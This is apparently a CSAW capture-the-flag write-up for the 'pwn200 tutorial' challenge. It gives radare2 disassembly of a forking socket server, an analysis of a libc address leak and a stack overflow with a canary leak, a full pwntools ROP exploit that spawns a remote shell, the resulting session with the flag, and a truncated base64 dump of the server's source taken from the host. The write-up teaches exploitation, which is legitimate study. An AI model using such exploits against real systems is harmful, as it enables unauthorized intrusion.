# Pwn200 "tutorial"

## The direct approach (with the benefit of hindsight)

The main function in `tutorial` is a lot bigger than in `warmup`
```
$ r2 tutorial
[0x00400c90]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x00400c90]> s main
[0x00401087]> pdf
            ;-- main:
╒ (fcn) sym.main 504
│           ; var int local_0h @ rbp-0x0
│           ; var int local_1h @ rbp-0x1
│           ; var int local_8h @ rbp-0x8
│           ; var int local_20h @ rbp-0x20
│           ; var int local_2ch @ rbp-0x2c
│           ; var int local_2eh @ rbp-0x2e
│           ; var int local_30h @ rbp-0x30
│           ; var int local_34h @ rbp-0x34
│           ; var int local_38h @ rbp-0x38
│           ; var int local_3ch @ rbp-0x3c
│           ; var int local_40h @ rbp-0x40
│           ; var int local_44h @ rbp-0x44
│           ; var int local_48h @ rbp-0x48
│           ; var int local_4ch @ rbp-0x4c
│           ; var int local_54h @ rbp-0x54
│           ; var int local_60h @ rbp-0x60
│           ; DATA XREF from 0x00400cad (sym.main)
│           0x00401087      55             pushq %rbp
│           0x00401088      4889e5         movq %rsp, %rbp
│           0x0040108b      4883ec60       subq $0x60, %rsp
│           0x0040108f      897dac         movl %edi, -0x54(%rbp)
│           0x00401092      488975a0       movq %rsi, -0x60(%rbp)
│           0x00401096      64488b042528.  movq %fs:0x28, %rax         ; [0x28:8]=0x2240 ; '('
│           0x0040109f      488945f8       movq %rax, -8(%rbp)
│           0x004010a3      31c0           xorl %eax, %eax
│           0x004010a5      c745b8010000.  movl $1, -0x48(%rbp)
│           0x004010ac      488d45b4       leaq -0x4c(%rbp), %rax
│           0x004010b0      4889c7         movq %rax, %rdi
│           0x004010b3      e8e8faffff     callq sym.imp.sigemptyset
│           0x004010b8      ba00000000     movl $0, %edx
│           0x004010bd      be01000000     movl $1, %esi
│           0x004010c2      bf02000000     movl $2, %edi
│           0x004010c7      e8b4fbffff     callq sym.imp.socket
│           0x004010cc      8945c0         movl %eax, -0x40(%rbp)
│           0x004010cf      837dc0ff       cmpl $-1, -0x40(%rbp)
│       ┌─< 0x004010d3      7514           jne 0x4010e9
│       │   0x004010d5      bfd8134000     movl $str.socket, %edi      ; "socket" @ 0x4013d8
│       │   0x004010da      e811fbffff     callq sym.imp.perror
│       │   0x004010df      bfffffffff     movl $0xffffffff, %edi      ; -1 ; -1
│       │   0x004010e4      e857fbffff     callq sym.imp.exit
│       │   ; JMP XREF from 0x004010d3 (sym.main)
│       └─> 0x004010e9      488d45d0       leaq -0x30(%rbp), %rax
│           0x004010ed      be10000000     movl $0x10, %esi
│           0x004010f2      4889c7         movq %rax, %rdi
│           0x004010f5      e806fbffff     callq sym.imp.bzero
│           0x004010fa      488d55b8       leaq -0x48(%rbp), %rdx
│           0x004010fe      8b45c0         movl -0x40(%rbp), %eax
│           0x00401101      41b804000000   movl $4, %r8d
│           0x00401107      4889d1         movq %rdx, %rcx
│           0x0040110a      ba02000000     movl $2, %edx
│           0x0040110f      be01000000     movl $1, %esi
│           0x00401114      89c7           movl %eax, %edi
│           0x00401116      e8b5f9ffff     callq sym.imp.setsockopt
│           0x0040111b      83f8ff         cmpl $-1, %eax
│       ┌─< 0x0040111e      7514           jne 0x401134
│       │   0x00401120      bfdf134000     movl $str.setsocket, %edi   ; "setsocket" @ 0x4013df
│       │   0x00401125      e8c6faffff     callq sym.imp.perror
│       │   0x0040112a      bfffffffff     movl $0xffffffff, %edi      ; -1 ; -1
│       │   0x0040112f      e80cfbffff     callq sym.imp.exit
│       │   ; JMP XREF from 0x0040111e (sym.main)
│       └─> 0x00401134      66c745d00200   movw $2, -0x30(%rbp)
│           0x0040113a      bf00000000     movl $0, %edi
│           0x0040113f      e8dcf9ffff     callq sym.imp.htonl
│           0x00401144      8945d4         movl %eax, -0x2c(%rbp)
│           0x00401147      488b45a0       movq -0x60(%rbp), %rax
│           0x0040114b      4883c008       addq $8, %rax
│           0x0040114f      488b00         movq (%rax), %rax
│           0x00401152      4889c7         movq %rax, %rdi
│           0x00401155      e8c6faffff     callq sym.imp.atoi
│           0x0040115a      0fb7c0         movzwl %ax, %eax
│           0x0040115d      89c7           movl %eax, %edi
│           0x0040115f      e8acf9ffff     callq sym.imp.htons
│           0x00401164      668945d2       movw %ax, -0x2e(%rbp)
│           0x00401168      488d45d0       leaq -0x30(%rbp), %rax
│           0x0040116c      4889c1         movq %rax, %rcx
│           0x0040116f      8b45c0         movl -0x40(%rbp), %eax
│           0x00401172      ba10000000     movl $0x10, %edx
│           0x00401177      4889ce         movq %rcx, %rsi
│           0x0040117a      89c7           movl %eax, %edi
│           0x0040117c      e84ffaffff     callq sym.imp.bind
│           0x00401181      83f8ff         cmpl $-1, %eax
│       ┌─< 0x00401184      7514           jne 0x40119a
│       │   0x00401186      bfe9134000     movl $str.bind, %edi        ; "bind" @ 0x4013e9
│       │   0x0040118b      e860faffff     callq sym.imp.perror
│       │   0x00401190      bfffffffff     movl $0xffffffff, %edi      ; -1 ; -1
│       │   0x00401195      e8a6faffff     callq sym.imp.exit
│       │   ; JMP XREF from 0x00401184 (sym.main)
│       └─> 0x0040119a      8b45c0         movl -0x40(%rbp), %eax
│           0x0040119d      be14000000     movl $0x14, %esi
│           0x004011a2      89c7           movl %eax, %edi
│           0x004011a4      e817faffff     callq sym.imp.listen
│           0x004011a9      83f8ff         cmpl $-1, %eax
│       ┌─< 0x004011ac      7514           jne 0x4011c2
│       │   0x004011ae      bfee134000     movl $str.listen, %edi      ; "listen" @ 0x4013ee
│       │   0x004011b3      e838faffff     callq sym.imp.perror
│       │   0x004011b8      bfffffffff     movl $0xffffffff, %edi      ; -1 ; -1
│       │   0x004011bd      e87efaffff     callq sym.imp.exit
│       │   ; JMP XREF from 0x004011ac (sym.main)
│       └─> 0x004011c2      c745bc100000.  movl $0x10, -0x44(%rbp)
│           ; JMP XREF from 0x0040127a (sym.main)
│           ; JMP XREF from 0x0040126b (sym.main)
│      ┌┌─> 0x004011c9      488d45e0       leaq -0x20(%rbp), %rax
│      ││   0x004011cd      4889c1         movq %rax, %rcx
│      ││   0x004011d0      488d55bc       leaq -0x44(%rbp), %rdx
│      ││   0x004011d4      8b45c0         movl -0x40(%rbp), %eax
│      ││   0x004011d7      4889ce         movq %rcx, %rsi
│      ││   0x004011da      89c7           movl %eax, %edi
│      ││   0x004011dc      e82ffaffff     callq sym.imp.accept
│      ││   0x004011e1      8945c4         movl %eax, -0x3c(%rbp)
│      ││   0x004011e4      837dc400       cmpl $0, -0x3c(%rbp)
│     ┌───< 0x004011e8      7914           jns 0x4011fe
│     │││   0x004011ea      bff5134000     movl $str.accept, %edi      ; "accept" @ 0x4013f5
│     │││   0x004011ef      e8fcf9ffff     callq sym.imp.perror
│     │││   0x004011f4      bf01000000     movl $1, %edi
│     │││   0x004011f9      e842faffff     callq sym.imp.exit
│     │││   ; JMP XREF from 0x004011e8 (sym.main)
│     └───> 0x004011fe      e86dfaffff     callq sym.imp.fork
│      ││   0x00401203      8945c8         movl %eax, -0x38(%rbp)
│      ││   0x00401206      837dc8ff       cmpl $-1, -0x38(%rbp)
│     ┌───< 0x0040120a      7514           jne 0x401220
│     │││   0x0040120c      bffc134000     movl $str.fork, %edi        ; "fork" @ 0x4013fc
│     │││   0x00401211      e8daf9ffff     callq sym.imp.perror
│     │││   0x00401216      8b45c4         movl -0x3c(%rbp), %eax
│     │││   0x00401219      89c7           movl %eax, %edi
│     │││   0x0040121b      e820f9ffff     callq sym.imp.close
│     │││   ; JMP XREF from 0x0040120a (sym.main)
│     └───> 0x00401220      837dc800       cmpl $0, -0x38(%rbp)
│     ┌───< 0x00401224      754a           jne 0x401270
│     │││   0x00401226      bf0f000000     movl $0xf, %edi
│     │││   0x0040122b      e800f9ffff     callq sym.imp.alarm
│     │││   0x00401230      8b45c0         movl -0x40(%rbp), %eax
│     │││   0x00401233      89c7           movl %eax, %edi
│     │││   0x00401235      e806f9ffff     callq sym.imp.close
│     │││   0x0040123a      bf01144000     movl $str.tutorial, %edi    ; "tutorial" @ 0x401401
│     │││   0x0040123f      e839fbffff     callq sym.priv
│     │││   0x00401244      8945cc         movl %eax, -0x34(%rbp)
│     │││   0x00401247      837dcc00       cmpl $0, -0x34(%rbp)
│    ┌────< 0x0040124b      751e           jne 0x40126b
│    ││││   0x0040124d      8b45c4         movl -0x3c(%rbp), %eax
│    ││││   0x00401250      89c7           movl %eax, %edi
│    ││││   0x00401252      e84bfdffff     callq sym.menu
│    ││││   0x00401257      8b45c4         movl -0x3c(%rbp), %eax
│    ││││   0x0040125a      89c7           movl %eax, %edi
│    ││││   0x0040125c      e8dff8ffff     callq sym.imp.close
│    ││││   0x00401261      bf00000000     movl $0, %edi
│    ││││   0x00401266      e8d5f9ffff     callq sym.imp.exit
│    ││││   ; JMP XREF from 0x0040124b (sym.main)
│    └─└──< 0x0040126b      e959ffffff     jmp 0x4011c9
│     │ │   ; JMP XREF from 0x00401224 (sym.main)
│     └───> 0x00401270      8b45c4         movl -0x3c(%rbp), %eax
│       │   0x00401273      89c7           movl %eax, %edi
│       │   0x00401275      e8c6f8ffff     callq sym.imp.close
╘       └─< 0x0040127a      e94affffff     jmp 0x4011c9
```

Most of it looks like boilerplate relating to accepting connections as a fork server, although it does set a 15-second time limit via `alarm`. After the boilerplate, it calls `priv("tutorial"); menu(some_stack_address) /* &some_stack_address == rbp-0x3c */ close(some_stack_address); exit(0);`. Since it's calling close on the stack address, and it passes it to a helper function (`menu`), it's probable that it's a socket desciptor, and that `menu` is a main function that uses the sd to communicate.

```
[0x00401087]> s sym.menu
[0x00400fa2]> pdf
╒ (fcn) sym.menu 229
│           ; var int local_10h @ rbp-0x10
│           ; var int local_14h @ rbp-0x14
│           ; CALL XREF from 0x00401252 (sym.menu)
│           0x00400fa2      55             pushq %rbp
│           0x00400fa3      4889e5         movq %rsp, %rbp
│           0x00400fa6      4883ec20       subq $0x20, %rsp
│           0x00400faa      897dec         movl %edi, -0x14(%rbp)
│           ; JMP XREF from 0x00401080 (sym.menu)
│       ┌─> 0x00400fad      8b45ec         movl -0x14(%rbp), %eax
│       │   0x00400fb0      ba0b000000     movl $0xb, %edx
│       │   0x00400fb5      be72134000     movl $str._Tutorial__n, %esi ; "-Tutorial-." @ 0x401372
│       │   0x00400fba      89c7           movl %eax, %edi
│       │   0x00400fbc      e81ffbffff     callq sym.imp.write
│       │   0x00400fc1      8b45ec         movl -0x14(%rbp), %eax
│       │   0x00400fc4      ba09000000     movl $9, %edx
│       │   0x00400fc9      be7e134000     movl $str.1.Manual_n, %esi  ; "1.Manual." @ 0x40137e
│       │   0x00400fce      89c7           movl %eax, %edi
│       │   0x00400fd0      e80bfbffff     callq sym.imp.write
│       │   0x00400fd5      8b45ec         movl -0x14(%rbp), %eax
│       │   0x00400fd8      ba0b000000     movl $0xb, %edx
│       │   0x00400fdd      be88134000     movl $str.2.Practice_n, %esi ; "2.Practice." @ 0x401388
│       │   0x00400fe2      89c7           movl %eax, %edi
│       │   0x00400fe4      e8f7faffff     callq sym.imp.write
│       │   0x00400fe9      8b45ec         movl -0x14(%rbp), %eax
│       │   0x00400fec      ba07000000     movl $7, %edx
│       │   0x00400ff1      be94134000     movl $str.3.Quit_n, %esi    ; "3.Quit." @ 0x401394
│       │   0x00400ff6      89c7           movl %eax, %edi
│       │   0x00400ff8      e8e3faffff     callq sym.imp.write
│       │   0x00400ffd      8b45ec         movl -0x14(%rbp), %eax
│       │   0x00401000      ba01000000     movl $1, %edx
│       │   0x00401005      be70134000     movl $0x401370, %esi
│       │   0x0040100a      89c7           movl %eax, %edi
│       │   0x0040100c      e8cffaffff     callq sym.imp.write
│       │   0x00401011      488d4df0       leaq -0x10(%rbp), %rcx
│       │   0x00401015      8b45ec         movl -0x14(%rbp), %eax
│       │   0x00401018      ba02000000     movl $2, %edx
│       │   0x0040101d      4889ce         movq %rcx, %rsi
│       │   0x00401020      89c7           movl %eax, %edi
│       │   0x00401022      e839fbffff     callq sym.imp.read
│       │   0x00401027      0fb645f0       movzbl -0x10(%rbp), %eax
│       │   0x0040102b      0fbec0         movsbl %al, %eax
│       │   0x0040102e      83f832         cmpl $0x32, %eax            ; '2'
│      ┌──< 0x00401031      7416           je 0x401049
│      ││   0x00401033      83f833         cmpl $0x33, %eax            ; '3'
│     ┌───< 0x00401036      741d           je 0x401055
│     │││   0x00401038      83f831         cmpl $0x31, %eax            ; '1'
│    ┌────< 0x0040103b      752e           jne 0x40106b
│    ││││   0x0040103d      8b45ec         movl -0x14(%rbp), %eax
│    ││││   0x00401040      89c7           movl %eax, %edi
│    ││││   0x00401042      e81bfeffff     callq sym.func1
│   ┌─────< 0x00401047      eb37           jmp 0x401080
│   │││││   ; JMP XREF from 0x00401031 (sym.menu)
│   │││└──> 0x00401049      8b45ec         movl -0x14(%rbp), %eax
│   │││ │   0x0040104c      89c7           movl %eax, %edi
│   │││ │   0x0040104e      e89ffeffff     callq sym.func2
│   │││┌──< 0x00401053      eb2b           jmp 0x401080
│   │││││   ; JMP XREF from 0x00401036 (sym.menu)
│   ││└───> 0x00401055      8b45ec         movl -0x14(%rbp), %eax
│   ││ ││   0x00401058      ba26000000     movl $0x26, %edx            ; '&'
│   ││ ││   0x0040105d      bea0134000     movl $str.You_still_did_not_solve_my_challenge._n, %esi ; "You still did not solve my challenge.." @ 0x4013a0
│   ││ ││   0x00401062      89c7           movl %eax, %edi
│   ││ ││   0x00401064      e877faffff     callq sym.imp.write
│   ││┌───< 0x00401069      eb1a           jmp 0x401085
│   │││││   ; JMP XREF from 0x0040103b (sym.menu)
│   │└────> 0x0040106b      8b45ec         movl -0x14(%rbp), %eax
│   │ │││   0x0040106e      ba10000000     movl $0x10, %edx
│   │ │││   0x00401073      bec7134000     movl $str.unknown_option._n, %esi ; "unknown option.." @ 0x4013c7
│   │ │││   0x00401078      89c7           movl %eax, %edi
│   │ │││   0x0040107a      e861faffff     callq sym.imp.write
│   │ │││   0x0040107f      90             nop
│   │ │││   ; JMP XREF from 0x00401053 (sym.menu)
│   │ │││   ; JMP XREF from 0x00401047 (sym.menu)
│   └──└└─< 0x00401080      e928ffffff     jmp 0x400fad
│     │     ; JMP XREF from 0x00401069 (sym.menu)
│     └───> 0x00401085      c9             leave
╘           0x00401086      c3             retq
```

This prints out a menu with 3 options ({"Manual", "Practice", "Quit"}), uses `read` to get the choice, then calls either `func1` or `func2` or exits, depending on the choice.

```
[0x00400e62]> pdf
╒ (fcn) sym.func1 144
│           ; var int local_8h @ rbp-0x8
│           ; var int local_40h @ rbp-0x40
│           ; var int local_48h @ rbp-0x48
│           ; var int local_54h @ rbp-0x54
│           ; CALL XREF from 0x00401042 (sym.func1)
│           0x00400e62      55             pushq %rbp
│           0x00400e63      4889e5         movq %rsp, %rbp
│           0x00400e66      4883ec60       subq $0x60, %rsp
│           0x00400e6a      897dac         movl %edi, -0x54(%rbp)
│           0x00400e6d      64488b042528.  movq %fs:0x28, %rax         ; [0x28:8]=0x2240 ; '('
│           0x00400e76      488945f8       movq %rax, -8(%rbp)
│           0x00400e7a      31c0           xorl %eax, %eax
│           0x00400e7c      be3e134000     movl $str.puts, %esi        ; "puts" @ 0x40133e
│           0x00400e81      48c7c7ffffff.  movq $-1, %rdi
│           0x00400e88      e8d3fdffff     callq sym.imp.dlsym
│           0x00400e8d      488945b8       movq %rax, -0x48(%rbp)
│           0x00400e91      8b45ac         movl -0x54(%rbp), %eax
│           0x00400e94      ba0a000000     movl $0xa, %edx
│           0x00400e99      be43134000     movl $str.Reference:, %esi  ; "Reference:" @ 0x401343
│           0x00400e9e      89c7           movl %eax, %edi
│           0x00400ea0      e83bfcffff     callq sym.imp.write
│           0x00400ea5      488b45b8       movq -0x48(%rbp), %rax
│           0x00400ea9      488d9000fbff.  leaq -0x500(%rax), %rdx
│           0x00400eb0      488d45c0       leaq -0x40(%rbp), %rax
│           0x00400eb4      be4e134000     movl $0x40134e, %esi
│           0x00400eb9      4889c7         movq %rax, %rdi
│           0x00400ebc      b800000000     movl $0, %eax
│           0x00400ec1      e86afdffff     callq sym.imp.sprintf
│           0x00400ec6      488d4dc0       leaq -0x40(%rbp), %rcx
│           0x00400eca      8b45ac         movl -0x54(%rbp), %eax
│           0x00400ecd      ba0f000000     movl $0xf, %edx
│           0x00400ed2      4889ce         movq %rcx, %rsi
│           0x00400ed5      89c7           movl %eax, %edi
│           0x00400ed7      e804fcffff     callq sym.imp.write
│           0x00400edc      488b45f8       movq -8(%rbp), %rax
│           0x00400ee0      644833042528.  xorq %fs:0x28, %rax
│       ┌─< 0x00400ee9      7405           je 0x400ef0
│       │   0x00400eeb      e810fcffff     callq sym.imp.__stack_chk_fail
│       │   ; JMP XREF from 0x00400ee9 (sym.func1)
│       └─> 0x00400ef0      c9             leave
╘           0x00400ef1      c3             retq
[0x00400e62]> psz @ 0x40134e
%p
```

`func1` gives us a leak to bypass ASLR, by looking up the address of `puts` in libc using `dlsym`, and printing out an offset (-0x500) from it. This, together with the version of libc they gave us,  allows us to calculate a libc base:
```
$ r2 libc-2.19.so
[0x00022050]> f~sym.puts
0x0006fd60 399 sym.puts
0x000fee00 1031 sym.putspent
0x00100830 555 sym.putsgent
```
```
libc_base = (puts_leak + 0x500) - 0x0006fd60
```

```
[0x00400ef2]> pdf
╒ (fcn) sym.func2 176
│           ; var int local_8h @ rbp-0x8
│           ; var int local_140h @ rbp-0x140
│           ; var int local_144h @ rbp-0x144
│           ; CALL XREF from 0x0040104e (sym.func2)
│           0x00400ef2      55             pushq %rbp
│           0x00400ef3      4889e5         movq %rsp, %rbp
│           0x00400ef6      4881ec500100.  subq $0x150, %rsp
│           0x00400efd      89bdbcfeffff   movl %edi, -0x144(%rbp)
│           0x00400f03      64488b042528.  movq %fs:0x28, %rax         ; [0x28:8]=0x2240 ; '('
│           0x00400f0c      488945f8       movq %rax, -8(%rbp)
│           0x00400f10      31c0           xorl %eax, %eax
│           0x00400f12      488d85c0feff.  leaq -0x140(%rbp), %rax
│           0x00400f19      be2c010000     movl $0x12c, %esi
│           0x00400f1e      4889c7         movq %rax, %rdi
│           0x00400f21      e8dafcffff     callq sym.imp.bzero
│           0x00400f26      8b85bcfeffff   movl -0x144(%rbp), %eax
│           0x00400f2c      ba1d000000     movl $0x1d, %edx
│           0x00400f31      be52134000     movl $str.Time_to_test_your_exploit..._n, %esi ; "Time to test your exploit...." @ 0x401352
│           0x00400f36      89c7           movl %eax, %edi
│           0x00400f38      e8a3fbffff     callq sym.imp.write
│           0x00400f3d      8b85bcfeffff   movl -0x144(%rbp), %eax
│           0x00400f43      ba01000000     movl $1, %edx
│           0x00400f48      be70134000     movl $0x401370, %esi
│           0x00400f4d      89c7           movl %eax, %edi
│           0x00400f4f      e88cfbffff     callq sym.imp.write
│           0x00400f54      488d8dc0feff.  leaq -0x140(%rbp), %rcx
│           0x00400f5b      8b85bcfeffff   movl -0x144(%rbp), %eax
│           0x00400f61      bacc010000     movl $0x1cc, %edx
│           0x00400f66      4889ce         movq %rcx, %rsi
│           0x00400f69      89c7           movl %eax, %edi
│           0x00400f6b      e8f0fbffff     callq sym.imp.read
│           0x00400f70      488d8dc0feff.  leaq -0x140(%rbp), %rcx
│           0x00400f77      8b85bcfeffff   movl -0x144(%rbp), %eax
│           0x00400f7d      ba44010000     movl $0x144, %edx
│           0x00400f82      4889ce         movq %rcx, %rsi
│           0x00400f85      89c7           movl %eax, %edi
│           0x00400f87      e854fbffff     callq sym.imp.write
│           0x00400f8c      488b45f8       movq -8(%rbp), %rax
│           0x00400f90      644833042528.  xorq %fs:0x28, %rax
│       ┌─< 0x00400f99      7405           je 0x400fa0
│       │   0x00400f9b      e860fbffff     callq sym.imp.__stack_chk_fail
│       │   ; JMP XREF from 0x00400f99 (sym.func2)
│       └─> 0x00400fa0      c9             leave
╘           0x00400fa1      c3             retq
```

`func2` allocates 0x150 bytes on the stack, stores a stack cookie at rbp-0x8, reads 0x1cc bytes into a buffer starting at rbp-0x144, and then writes out 0x144 bytes starting at rbp-0x144. This is both a stack smash and a leak of the cookie.

My approach to exploiting this was to send an initial string of "ABCD" to get the leak containing the cookie. The 'A' occurs at rbp-0x144, and the leak ends at rbp, so rbp-8 should start 0x13c bytes from the 'A', but dynamic testing revealed that 0x138 is the correct offset.

Since we have a libc leak, we can return to `system("/bin/sh")` using addresses in just libc. Since `tutorial` is a socket-based server, we also need to `dup2(our_sd, stdout); dup2(our_sd, stdin)` in order to be able to use the shell.

Functions and arguments:
```
$ r2 libc-2.19.so
[0x00022050]> f~sym.dup2
0x000ebe90 33 sym.dup2
[0x00022050]> f~sym.system
0x00046590 45 sym.system
[0x00022050]> / /bin/sh
Searching 7 bytes from 0x00000270 to 0x003c42c0: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0x270-0x3c42c0]
hits: 1
0x0017c8c3 hit0_0 "/bin/sh"
```
Gadgets to control the arguments:
```
$ ROPgadget --binary libc-2.19.so | grep ': pop r[ds]i ; ret'
0x0000000000022b9a : pop rdi ; ret
0x0000000000116d5d : pop rdi ; ret 0x2a
0x0000000000024885 : pop rsi ; ret
0x0000000000105a9e : pop rsi ; ret 0xffff
```
Putting it all together:
```
from pwn import *

p = remote('pwn.chal.csaw.io', 8002)

p.sendline('1')

r = 'Reference:0x([0-9a-f]*)\n'
has_puts_leak = p.recvregex(r)
print(has_puts_leak)
puts_leak = int(re.findall(r, has_puts_leak)[0], 16)
print('puts_leak: %x' % (puts_leak,))

libc_base = (puts_leak + 0x500) - 0x0006fd60
print('libc_base: %x' % (libc_base,))

pack = lambda x: __import__('struct').pack('<Q', x)

system = pack(libc_base + 0x00046590)
libc_dup2 = pack(libc_base + 0x000ebe90)
binsh = pack(libc_base + 0x0017c8c3)
rsi = pack(libc_base + 0x0000000000024885)
rdi = pack(libc_base + 0x0000000000022b9a)

# ret2dup2(fd) generates a ropchain for: dup2(fd, stdout); dup2(fd, stdin)
ret2dup2 = lambda fd: rdi+pack(fd)+rsi+pack(1)+libc_dup2 + rdi+pack(fd)+rsi+pack(0)+libc_dup2
# ret2system generates a ropchain for: system("/bin/sh")
ret2system = rdi + binsh + system

p.sendline('2')
p.sendline('ABCD')
has_cookie = []
has_cookie.append(p.recvregex('-Tutorial-'))
has_cookie.append(p.recvregex('-Tutorial-'))
prefix = has_cookie[1][has_cookie[1].index('ABCD'):]

p.sendline('2')

payload = list("A"*0x1cc)
def augment(offset, x):
    global payload
    payload[offset:offset+len(x)] = x
payload[0x138:0x140] = prefix[0x138:0x140]
augment(0x148, ret2dup2(4)+ret2system)

p.send(''.join(payload))

p.interactive()
```
Running it to get a shell, and the flag:
```
$ ./pwn200_tutorial_exploit.cleaned.py
[+] Opening connection to pwn.chal.csaw.io on port 8002: Done
-Tutorial-
1.Manual
2.Practice
3.Quit
>Reference:0x7f3549a44860

puts_leak: 7f3549a44860
libc_base: 7f35499d5000
[*] Switching to interactive mode

1.Manual
2.Practice
3.Quit
>Time to test your exploit...
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xff\x12I�G؃AAAA$
$ ls -l
total 24
-rw-rw-r-- 1 root root    45 Sep 16 21:13 flag.txt
-rwxr-xr-x 1 root root 14088 Sep 16 21:33 tutorial
-rw-rw-r-- 1 root root  3258 Sep 16 21:13 tutorial.c
$ cat flag.txt
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
```

This also allows us to exfiltrate a copy of the source code, since they were nice enough to leave that on the server:
```
$ base64 tutorial.c | tr '\n' ' '
I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHB3ZC5oPgoj aW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5cy9zb2Nr ZXQuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+CiNpbmNs dWRlIDxuZXRpbmV0L2luLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8ZXJybm8uaD4K I2luY2x1ZGUgPHNpZ25hbC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpbnQu aD4KCmludCBwcml2KGNoYXIgKnVzZXJuYW1lKSB7CiAgICBzdHJ1Y3QgcGFzc3dkICpwdyA9IGdl dHB3bmFtKHVzZXJuYW1lKTsKICAgIGlmIChwdyA9PSBOVUxMKSB7CiAgICAgICAgZnByaW50Zihz dGRlcnIsICJVc2VyICVzIGRvZXMgbm90IGV4aXN0XG4iLCB1c2VybmFtZSk7CiAgICAgICAgcmV0 dXJuIDE7CiAgICB9CgogICAgaWYgKGNoZGlyKHB3LT5wd19kaXIpICE9IDApIHsKICAgICAgICBw ZXJyb3IoImNoZGlyIik7CiAgICAgICAgcmV0dXJuIDE7CiAgICB9CgoKICAgIGlmIChzZXRncm91 cHMoMCwgTlVMTCkgIT0gMCkgewogICAgICAgIHBlcnJvcigic2V0Z3JvdXBzIik7CiAgICAgICAg cmV0dXJuIDE7CiAgICB9CgogICAgaWYgKHNldGdpZChwdy0+cHdfZ2lkKSAhPSAwKSB7CiAgICAg ICAgcGVycm9yKCJzZXRnaWQiKTsKICAgICAgICByZXR1cm4gMTsKICAgIH0KCiAgICBpZiAoc2V0 dWlkKHB3LT5wd191aWQpICE9IDApIHsKICAgICAgICBwZXJyb3IoInNldHVpZCIpOwogICAgICAg IHJldHVybiAxOwogICAgfQoKICAgIHJldHVybiAwOwp9Cgp2b2lkIGZ1bmMxKGludCBmZCl7CiAg ICAKICAgCgljaGFyIGFkZHJlc3NbNTBdOwoJdm9pZCAoKnB1dHNfYWRkcikoaW50KSA9IGRsc3lt KFJUTERfTkVYVCwicHV0cyIpOwogICAgCXdyaXRlKGZkLCJSZWZlcmVuY2U6IiwxMCk7CglzcHJp bnRmKGFkZHJlc3MsIiVwXG4iLHB1dHNfYWRkci0weDUwMCk7CiAgICAJd3JpdGUoZmQsYWRkcmVz cywxNSk7CgoKICAgIAp9Cgp2b2lkIGZ1bmMyKGludCBmZCl7ICAgIAogICAgY2hhciBwb3ZbMzAw XTsKICAgIGJ6ZXJvKHBvdiwzMDApOyAgICAKCiAgICB3cml0ZShmZCwiVGltZSB0byB0ZXN0IHlv dXIgZXhwbG9pdC4uLlxuIiwyOSk7CiAgICB3cml0ZShmZCwiPiIsMSk7CiAgICByZWFkKGZkLHBv diw0NjApOwogICAgd3JpdGUoZmQscG92LDMyNCk7Cgp9CgogICAKICAgIAp2b2lkIG1lbnUoaW50 IGZkKXsKICAgIHdoaWxlKDEpewogICAgICAgIGNoYXIgb3B0aW9uWzJdOwogICAgICAgIHdyaXRl KGZkLCItVHV0b3JpYWwtXG4iLDExKTsKICAgICAgICB3cml0ZShmZCwiMS5NYW51YWxcbiIsOSk7 CiAgICAgICAgd3JpdGUoZmQsIjIuUHJhY3RpY2VcbiIsMTEpOwogICAgICAgIHdyaXRlKGZkLCIz LlF1aXRcbiIsNyk7CiAgICAgICAgd3JpdGUoZmQsIj4iLDEpOyAgICAgICAgcmVhZChmZCxvcHRp b24sMik7CiAgICAgICAgc3dpdGNoKG9wdGlvblswXSl7CiAgICAgICAgICAgIGNhc2UgJzEnOgog ICAgICAgICAgICAgICAgZnVuYzEoZmQpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAg ICAgIGNhc2UgJzInOgogICAgICAgICAgICAgICAgZnVuYzIoZmQpOwogICAgICAgICAgICAgICAg YnJlYWs7CiAgICAgICAgICAgIGNhc2UgJzMnOgogICAgICAgICAgICAgICAgd3JpdGUoZmQsIllv dSBzdGlsbCBkaWQgbm90IHNvbHZlIG15IGNoYWxsZW5nZS5cbiIsMzgpOwogICAgICAgICAgICAg ICAgcmV0dXJuOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgd3JpdGUoZmQs InVua25vd24gb3B0aW9uLlxuIiwxNik7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9 ICAgIAogICAgfQp9CgppbnQgbWFpbiggaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSApIHsgICAKICBp bnQgZml2ZTsKICBpbnQgbXlpbnQgPSAxOyAgIAogIHN0cnVjdCBzb2NrYWRkcl9pbiBzZXJ2ZXIs Y2xpZW50OyAgICAKICBzaWdlbXB0eXNldCgoc2lnc2V0X3QgKikmZml2ZSk7ICAgCiAgaW50IGlu aXRfZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIDApOyAgICAgCgogIGlmIChpbml0 X2ZkID09IC0xKSB7CiAgICAgcGVycm9yKCJzb2NrZXQiKTsKICAgICBleGl0KC0xKTsKICB9ICAg CiAgYnplcm8oKGNoYXIgKikgJnNlcnZlciwgc2l6ZW9mKHNlcnZlcikpOyAgIAogIAogIGlmKHNl 